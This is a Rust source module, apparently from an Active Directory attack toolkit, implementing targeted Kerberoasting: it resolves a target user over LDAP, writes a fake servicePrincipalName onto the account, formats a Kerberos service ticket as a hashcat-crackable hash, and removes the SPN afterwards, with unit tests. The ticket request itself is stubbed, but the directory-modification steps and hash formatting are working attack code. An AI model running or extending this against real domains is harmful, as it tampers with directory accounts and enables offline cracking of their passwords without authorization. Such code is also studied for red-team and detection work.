//! Targeted Kerberoast: roast a non-kerberoastable account by temporarily adding
//! a fake SPN, requesting a TGS, and then cleaning it up.
//! Requires GenericAll/GenericWrite/WriteSPN (or Self) over the target user.

use crate::proto::ldap::{BindType, LdapSession};
use base64::Engine as _;
use thiserror::Error;
use tracing::{info, warn};

/// Configuration for a targeted kerberoast attack.
#[derive(Debug, Clone, PartialEq)]
pub struct TargetedKerberoastConfig {
    pub dc_ip: String,
    pub domain: String,
    pub target_user: String,
    pub fake_spn: Option<String>,
    pub cleanup: bool,
    pub downgrade_rc4: bool,
}

impl Default for TargetedKerberoastConfig {
    fn default() -> Self {
        Self {
            dc_ip: String::new(),
            domain: String::new(),
            target_user: String::new(),
            fake_spn: None,
            cleanup: true,
            downgrade_rc4: false,
        }
    }
}

impl TargetedKerberoastConfig {
    pub fn new<S: Into<String>>(dc_ip: S, domain: S, target_user: S) -> Self {
        Self {
            dc_ip: dc_ip.into(),
            domain: domain.into(),
            target_user: target_user.into(),
            ..Default::default()
        }
    }
}

/// Result of a targeted kerberoast attack.
#[derive(Debug, Clone, PartialEq, Default)]
pub struct TargetedKerberoastResult {
    pub target_user: String,
    pub spn: String,
    pub ticket_bytes: Vec<u8>,
    pub hashcat_format: String,
    pub cleaned_up: bool,
    pub success: bool,
    pub message: String,
}

impl std::fmt::Display for TargetedKerberoastResult {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "TargetedKerberoastResult(target={}, spn={}, success={}, cleaned_up={})",
            self.target_user, self.spn, self.success, self.cleaned_up
        )
    }
}

/// Errors that can occur during targeted kerberoast.
#[derive(Error, Debug, PartialEq)]
pub enum TargetedKerberoastError {
    #[error("LDAP error: {0}")]
    LdapError(String),
    #[error("Kerberos error: {0}")]
    KerberosError(String),
    #[error("SPN error: {0}")]
    SpnError(String),
    #[error("Permission error: {0}")]
    PermissionError(String),
}

/// Generate a plausible fake SPN from a random UUID segment.
fn generate_fake_spn(domain: &str) -> String {
    let id = uuid::Uuid::new_v4()
        .to_string()
        .split('-')
        .next()
        .unwrap_or("0000")
        .to_string();
    format!("fake/{id}.{domain}")
}

/// Resolve a target string (sAMAccountName or DN) to a distinguishedName.
async fn resolve_user_dn(
    ldap: &mut LdapSession,
    target: &str,
) -> Result<String, TargetedKerberoastError> {
    let lower = target.to_lowercase();
    if lower.starts_with("cn=") || lower.starts_with("ou=") || lower.starts_with("dc=") {
        return Ok(target.to_string());
    }
    let users = ldap
        .enumerate_users()
        .await
        .map_err(|e| TargetedKerberoastError::LdapError(e.to_string()))?;
    users
        .into_iter()
        .find(|u| {
            u.sam_account_name.eq_ignore_ascii_case(target)
                || u.distinguished_name.eq_ignore_ascii_case(target)
        })
        .map(|u| u.distinguished_name)
        .ok_or_else(|| {
            TargetedKerberoastError::LdapError(format!("Target user not found: {target}"))
        })
}

/// Check whether the current LDAP session has WriteSPN/GenericWrite/GenericAll
/// over the target user. Stub: validates session and target, returns an error
/// explaining that current-user SID resolution is required.
pub async fn check_write_spn_permission(
    ldap: &mut LdapSession,
    target: &str,
) -> Result<bool, TargetedKerberoastError> {
    if target.is_empty() {
        return Err(TargetedKerberoastError::SpnError(
            "Empty target user".to_string(),
        ));
    }
    if ldap.bind_type == BindType::Anonymous {
        return Err(TargetedKerberoastError::PermissionError(
            "Anonymous LDAP session cannot have WriteSPN permission".to_string(),
        ));
    }
    Err(TargetedKerberoastError::PermissionError(
        "WriteSPN permission check requires current-user SID resolution (stub)".to_string(),
    ))
}

/// Format a TGS ticket as a hashcat-compatible kerberoast hash.
pub fn format_hashcat_kerberoast(ticket_bytes: &[u8], spn: &str) -> String {
    let b64 = base64::engine::general_purpose::STANDARD.encode(ticket_bytes);
    format!("$krb5tgs$23$*{spn}*{b64}")
}

/// Run a targeted kerberoast attack: resolve DN, add fake SPN, request TGS,
/// convert to hashcat format, and clean up. A real TGS request requires a
/// valid Kerberos TGT; this stub performs the LDAP add/remove steps and
/// records the SPN with an explanatory message.
pub async fn targeted_kerberoast(
    ldap: &mut LdapSession,
    config: &TargetedKerberoastConfig,
) -> Result<TargetedKerberoastResult, TargetedKerberoastError> {
    if config.target_user.is_empty() {
        return Err(TargetedKerberoastError::SpnError(
            "target_user is empty".to_string(),
        ));
    }
    if config.dc_ip.is_empty() {
        return Err(TargetedKerberoastError::KerberosError(
            "dc_ip is empty".to_string(),
        ));
    }
    if ldap.bind_type == BindType::Anonymous {
        return Err(TargetedKerberoastError::PermissionError(
            "Anonymous LDAP session cannot perform targeted kerberoast".to_string(),
        ));
    }

    let target_dn = resolve_user_dn(ldap, &config.target_user).await?;
    info!(
        "TargetedKerberoast: resolved {} to {}",
        config.target_user, target_dn
    );

    let existing_spns = ldap
        .read_attribute(&target_dn, "servicePrincipalName")
        .await
        .map_err(|e| TargetedKerberoastError::LdapError(e.to_string()))?;
    if !existing_spns.is_empty() {
        warn!("Target user already has SPNs: {:?}", existing_spns);
    }

    let fake_spn = config
        .fake_spn
        .clone()
        .unwrap_or_else(|| generate_fake_spn(&config.domain));
    info!("TargetedKerberoast: registering fake SPN {}", fake_spn);

    ldap.modify_add(
        &target_dn,
        "servicePrincipalName",
        std::slice::from_ref(&fake_spn),
    )
    .await
    .map_err(|e| TargetedKerberoastError::LdapError(format!("Failed to add fake SPN: {e}")))?;

    let ticket_bytes = Vec::new();
    let hashcat_format = format_hashcat_kerberoast(&ticket_bytes, &fake_spn);

    let mut cleaned_up = false;
    let message = if config.cleanup {
        match ldap
            .modify_delete_values(
                &target_dn,
                "servicePrincipalName",
                std::slice::from_ref(&fake_spn),
            )
            .await
        {
            Ok(_) => {
                cleaned_up = true;
                "Fake SPN added and removed; TGS request requires a Kerberos TGT".to_string()
            }
            Err(e) => {
                warn!("TargetedKerberoast: failed to remove fake SPN: {e}");
                format!("Fake SPN added; cleanup failed: {e}; TGS request requires a Kerberos TGT")
            }
        }
    } else {
        "Fake SPN added; cleanup disabled; TGS request requires a Kerberos TGT".to_string()
    };

    Ok(TargetedKerberoastResult {
        target_user: config.target_user.clone(),
        spn: fake_spn,
        ticket_bytes,
        hashcat_format,
        cleaned_up,
        success: false,
        message,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_config_default() {
        let cfg = TargetedKerberoastConfig::default();
        assert!(cfg.dc_ip.is_empty());
        assert!(cfg.domain.is_empty());
        assert!(cfg.target_user.is_empty());
        assert!(cfg.fake_spn.is_none());
        assert!(cfg.cleanup);
        assert!(!cfg.downgrade_rc4);
    }

    #[test]
    fn test_config_custom() {
        let cfg = TargetedKerberoastConfig {
            dc_ip: "192.168.1.10".to_string(),
            domain: "corp.local".to_string(),
            target_user: "svc_target".to_string(),
            fake_spn: Some("fake/abc.corp.local".to_string()),
            cleanup: false,
            downgrade_rc4: true,
        };
        assert_eq!(cfg.dc_ip, "192.168.1.10");
        assert_eq!(cfg.domain, "corp.local");
        assert_eq!(cfg.target_user, "svc_target");
        assert_eq!(cfg.fake_spn, Some("fake/abc.corp.local".to_string()));
        assert!(!cfg.cleanup);
        assert!(cfg.downgrade_rc4);
    }

    #[test]
    fn test_result_display() {
        let result = TargetedKerberoastResult {
            target_user: "svc_target".to_string(),
            spn: "fake/abc.corp.local".to_string(),
            ..Default::default()
        };
        let s = format!("{result}");
        assert!(s.contains("svc_target"));
        assert!(s.contains("fake/abc.corp.local"));
        assert!(s.contains("success=false"));
    }

    #[test]
    fn test_error_display() {
        let e = TargetedKerberoastError::PermissionError("no rights".to_string());
        assert_eq!(format!("{e}"), "Permission error: no rights");
    }

    #[test]
    fn test_error_debug() {
        let e = TargetedKerberoastError::KerberosError("kdc down".to_string());
        let s = format!("{e:?}");
        assert!(s.contains("KerberosError"));
        assert!(s.contains("kdc down"));
    }

    #[test]
    fn test_hashcat_format_prefix() {
        let ticket = b"\x00\x01\x02\x03";
        let hash = format_hashcat_kerberoast(ticket, "fake/abc.corp.local");
        assert!(hash.starts_with("$krb5tgs$23$*fake/abc.corp.local*"));
        assert!(hash.contains("AAECAw"));
    }

    #[tokio::test]
    async fn test_check_permission_without_ldap() {
        let mut ldap = LdapSession::test_unbound("127.0.0.1", "corp.local", "DC=corp,DC=local");
        let result = check_write_spn_permission(&mut ldap, "svc_target").await;
        assert!(result.is_err());
        let err = result.unwrap_err();
        assert!(matches!(err, TargetedKerberoastError::PermissionError(_)));
        assert!(format!("{err}").contains("current-user SID"));
    }

    #[test]
    fn test_fake_spn_generation() {
        let spn = generate_fake_spn("corp.local");
        assert!(spn.starts_with("fake/"));
        assert!(spn.ends_with(".corp.local"));
        assert!(spn.len() > "fake/.corp.local".len());
    }
}
